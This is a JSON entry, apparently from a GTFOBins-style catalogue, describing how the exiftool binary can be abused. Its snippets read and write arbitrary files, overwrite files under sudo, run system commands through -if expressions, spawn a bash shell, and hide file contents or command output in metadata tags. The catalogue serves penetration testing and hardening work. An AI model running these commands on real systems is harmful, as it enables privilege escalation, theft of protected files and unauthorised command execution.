{
  "description": "If the permissions allow it, files are moved (instead of copied) to the destination.",
  "functions": {
    "file-read": [
      {
        "code": "LFILE=file_to_read\nOUTPUT=output_file\nexiftool -filename=$OUTPUT $LFILE\ncat $OUTPUT"
      },
      {
        "description": "Exfiltrate file data via metadata tags",
        "code": "LFILE=file_read\nINPUT=input_file\nexiftool \"-description<=$LFILE\" --filename $INPUT"
      }
    ],
    "file-write": [
      {
        "code": "LFILE=file_to_write\nINPUT=input_file\nexiftool -filename=$LFILE $INPUT"
      },
      {
        "description": "Write file from metadata tag's content",
        "code": "LFILE=file_to_write\nINPUT=input_file\nexiftool -description -W $LFILE --filename $INPUT"
      }
    ],
    "sudo": [
      {
        "code": "LFILE=file_to_write\nINPUT=input_file\nsudo exiftool -filename=$LFILE $INPUT"
      }
    ],
    "command": [
      {
        "code": "COMMAND=command_to_execute\nINPUT=input_file\nexiftool -if \"system('$COMMAND');1\" --filename $INPUT"
      },
      {
        "description": "Run system command and exfiltrate result via metadata tags",
        "code": "COMMAND=command_to_execute\nINPUT=input_file\nexiftool -userparam \"inj=Test\" -if \"\\$\\$self{OPTIONS}{UserParam}{inj}=\\`$COMMAND\\`;1\" '-description<$inj' --filename $INPUT"
      }
    ],
    "shell": [
      {
        "code": "INPUT=input_file\nexiftool -if \"system('bash')\" $INPUT"
      }
    ]
  }
}
